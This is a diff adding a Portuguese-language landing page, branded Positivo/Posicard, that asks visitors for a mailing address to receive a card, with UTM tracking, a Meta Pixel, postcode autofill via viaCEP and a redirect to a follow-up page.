@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <link href="css/ZOl9ympywH68.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+  
+  
+    <script>
+        // Função para obter os parâmetros UTM da URL
+        function getUTMParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+        
+            // Verifica se existem parâmetros UTM e os armazena em um objeto
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(param => {
+                const value = urlParams.get(param);
+                if (value) {
+                    utmParams[param] = value;
+                }
+            });
+        
+            return utmParams;
+        }
+        
+        // Armazena os parâmetros UTM no localStorage
+        function storeUTMParameters(utmParams) {
+            if (Object.keys(utmParams).length > 0) {
+                localStorage.setItem('utmParams', JSON.stringify(utmParams));
+            }
+        }
+        
+        // Adiciona os parâmetros UTM armazenados em todas as URLs da página
+        function appendUTMParametersToLinks() {
+            const storedUTM = JSON.parse(localStorage.getItem('utmParams'));
+            if (!storedUTM) return;
+        
+            const allLinks = document.querySelectorAll('a[href]');
+            allLinks.forEach(link => {
+                const url = new URL(link.href);
+                Object.keys(storedUTM).forEach(param => {
+                    url.searchParams.set(param, storedUTM[param]);
+                });
+                link.href = url.toString();
+            });
+        }
+        
+        // Quando a página carregar, captura os parâmetros UTM e os armazena
+        document.addEventListener('DOMContentLoaded', () => {
+            const utmParams = getUTMParameters();
+            storeUTMParameters(utmParams);
+            appendUTMParametersToLinks();
+        });
+        </script>
+  
+  
+    <style>
+        .header {
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%,rgb(0, 73, 144) 54.8%, rgb(250, 99, 160) 93.4%);
+        color: white;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        grid-area: top-bar;
+    }
+    .main-content {
+        max-width: 450px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem 2rem 1rem 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 0 auto;
+    }
+    .main-content h2 {
+        margin-bottom: 20px;
+    }
+    .btn-custom {
+        color: white;
+        border: none;
+        width: 100%;
+        margin-bottom: 10px;
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(255, 0, 0) 93.4%);
+        font-weight: 600;
+        border-radius: 1rem;
+        padding: .75rem 3rem;
+        letter-spacing: .3px;
+        line-height: 1.15;
+    }
+    .btn-custom:hover{
+        color: black !important;
+        background-color: #00adca !important;
+        transform: scale(1.02) !important;
+    }
+    
+    .footer {
+        background-color: #ffffff;
+        border-top: solid 1px #e6dddd;
+        color: #000;
+        text-align: center;
+        width: 100%;
+        bottom: 0;
+        grid-area: footer;
+        border-bottom: solid 3px #e6007e;
+        padding: 2rem 0.5rem;
+        position: relative;
+        margin-top: 50px;
+    }
+    
+    #conclusao {
+        display: none; /* Esconde o elemento por padrão */
+    }
+    
+    #conclusao h4 {
+        color: green; /* Define a cor do texto */
+        font-weight: bold; /* Define o texto em negrito */
+    }
+    
+    .char {
+        border-top: solid px #00adca;
+        background-color: #00adca;
+        padding: 2px !important;
+    }/* End custom CSS */
+
+
+    </style>
+
+
+<!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1249577276382820');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1249577276382820&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+
+
+    
+   </head>
+
+<body>
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="images/zC8zssD4oCeT.png" alt="Imagem Centralizada" data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada"></noscript>
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div class="main-content">
+            <!-- Formulário de endereço -->
+          <strong <h4="">Vamos enviar seu cartão pelos Correios.</strong>
+            <p>Informe seu endereço:</p>
+            
+          <form id="form-endereco" class="text-start" action="gerente.html" method="post">
+    <div class="mb-3">
+        <label for="cep" class="form-label">CEP</label>
+        <input type="text" class="form-control" id="cep" placeholder="00000-000" onblur="buscarCEP()">
+    </div>
+    <div id="endereco-completo">
+        <div class="mb-3">
+            <label for="rua" class="form-label">Rua</label>
+            <input type="text" class="form-control" id="rua">
+        </div>
+        <div class="mb-3">
+            <label for="numero" class="form-label">Número</label>
+            <input type="text" class="form-control" id="numero">
+        </div>
+        <div class="mb-3">
+            <label for="complemento" class="form-label">Complemento</label>
+            <input type="text" class="form-control" id="complemento">
+        </div>
+        <div class="mb-3">
+            <label for="bairro" class="form-label">Bairro</label>
+            <input type="text" class="form-control" id="bairro">
+        </div>
+        <div class="mb-3">
+            <label for="cidade" class="form-label">Cidade</label>
+            <input type="text" class="form-control" id="cidade">
+        </div>
+        <div class="mb-3">
+            <label for="estado" class="form-label">Estado</label>
+            <select class="form-select" id="estado">
+                <option value="AC">Acre</option>
+                <option value="AL">Alagoas</option>
+                <option value="AP">Amapá</option>
+                <option value="AM">Amazonas</option>
+                <option value="BA">Bahia</option>
+                <option value="CE">Ceará</option>
+                <option value="DF">Distrito Federal</option>
+                <option value="ES">Espírito Santo</option>
+                <option value="GO">Goiás</option>
+                <option value="MA">Maranhão</option>
+                <option value="MT">Mato Grosso</option>
+                <option value="MS">Mato Grosso do Sul</option>
+                <option value="MG">Minas Gerais</option>
+                <option value="PA">Pará</option>
+                <option value="PB">Paraíba</option>
+                <option value="PR">Paraná</option>
+                <option value="PE">Pernambuco</option>
+                <option value="PI">Piauí</option>
+                <option value="RJ">Rio de Janeiro</option>
+                <option value="RN">Rio Grande do Norte</option>
+                <option value="RS">Rio Grande do Sul</option>
+                <option value="RO">Rondônia</option>
+                <option value="RR">Roraima</option>
+                <option value="SC">Santa Catarina</option>
+                <option value="SP">São Paulo</option>
+                <option value="SE">Sergipe</option>
+                <option value="TO">Tocantins</option>
+            </select>
+        </div>
+    </div>
+    <button type="button" id="continuarAg" class="btn-custom w-100 rounded-pill" onclick="redirectToGerente()">Continuar</button>
+</form>
+
+<script>
+    function redirectToGerente() {
+        window.location.href = '../gerente/index.html';
+    }
+</script>
+
+    
+                 
+                </div>
+            <input type="hidden" name="utm_source" value="organicjLj66cbfd26af5670717b8c0905"><input type="hidden" name="utm_campaign" value="rKm-km-rKm"><input type="hidden" name="utm_medium" value=""><input type="hidden" name="utm_content" value=""><input type="hidden" name="utm_term" value=""><input type="hidden" name="subid" value="organicjLj66cbfd26af5670717b8c0905"><input type="hidden" name="sid2" value="rKm-km-rKm"><input type="hidden" name="subid2" value="rKm-km-rKm"><input type="hidden" name="subid3" value=""><input type="hidden" name="subid4" value=""><input type="hidden" name="subid5" value="rKm-km-rKm"><input type="hidden" name="xcod" value="organicjLj66cbfd26af5670717b8c0905hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR"><input type="hidden" name="sck" value="organicjLj66cbfd26af5670717b8c0905hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR">
+        </div>
+    </div>
+
+    <script>
+        function buscarCEP() {
+            const cep = document.getElementById('cep').value;
+            if (cep) {
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            // Grava os novos dados no localStorage
+                            localStorage.setItem('rua', data.logradouro);
+                            localStorage.setItem('numero', '');
+                            localStorage.setItem('complemento', '');
+                            localStorage.setItem('bairro', data.bairro);
+                            localStorage.setItem('cidade', data.localidade);
+                            localStorage.setItem('estado', data.uf);
+                            localStorage.setItem('cep', cep);
+
+                            document.getElementById('rua').value = data.logradouro;
+                            document.getElementById('bairro').value = data.bairro;
+                            document.getElementById('cidade').value = data.localidade;
+                            document.getElementById('estado').value = data.uf;
+
+                            // Exibe os campos de endereço
+                            document.getElementById('footerChg').style.position = "relative";
+                            document.getElementById('endereco-completo').style.display = 'relative';
+                        } else {
+                            alert('CEP não encontrado.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Erro ao buscar CEP.');
+                        console.error('Erro:', error);
+                    });
+            }
+        }
+        
+        document.getElementById('form-endereco').addEventListener('submit', function(event) {
+            event.preventDefault(); // Previne o comportamento padrão do formulário
+            
+            const rua = document.getElementById('rua');
+            const bairro = document.getElementById('bairro');
+            const numero = document.getElementById('numero');
+            const complemento = document.getElementById('complemento');
+            const cidade = document.getElementById('cidade');
+            const estado = document.getElementById('estado');
+            const cep = document.getElementById('cep');
+            let formValido = true;
+
+            // Função para exibir erro
+            function mostrarErro(campo, mensagem) {
+                const mensagemErro = document.createElement('div');
+                mensagemErro.className = 'mensagem-erro';
+                mensagemErro.innerText = mensagem;
+                campo.classList.add('campo-erro');
+                campo.parentNode.appendChild(mensagemErro);
+                formValido = false;
+            }
+
+            // Função para limpar erros
+            function limparErros(campo) {
+                campo.classList.remove('campo-erro');
+                const erroAnterior = campo.parentNode.querySelector('.mensagem-erro');
+                if (erroAnterior) {
+                    erroAnterior.remove();
+                }
+            }
+
+            // Limpa erros prévios
+            limparErros(rua);
+            limparErros(bairro);
+
+            // Validação do campo "Rua"
+            if (rua.value.trim() === '') {
+                mostrarErro(rua, 'Por favor, preencha este campo.');
+            }
+
+            // Validação do campo "Bairro"
+            if (bairro.value.trim() === '') {
+                mostrarErro(bairro, 'Por favor, preencha este campo Bairro.');
+            }
+            
+            if(formValido){
+                // Atualiza os valores no localStorage antes de redirecionar
+                localStorage.setItem('rua', rua.value.trim());
+                localStorage.setItem('numero', numero.value.trim());
+                localStorage.setItem('complemento', complemento.value.trim());
+                localStorage.setItem('bairro', bairro.value.trim());
+                localStorage.setItem('cidade', cidade.value.trim());
+                localStorage.setItem('estado', estado.value);
+                localStorage.setItem('cep', cep.value.trim());
+
+                window.location.href = 'gerente.html';
+            }
+        });
+        
+    </script>
+
+    <div class="footer py-4" id="footerChg">
+         © 2024 Positivo Brasil. CNPJ 36.401.269/0001-27. <br>
+         Todos os direitos reservados
+    </div>
+
+
+
+
+
+</body></html>
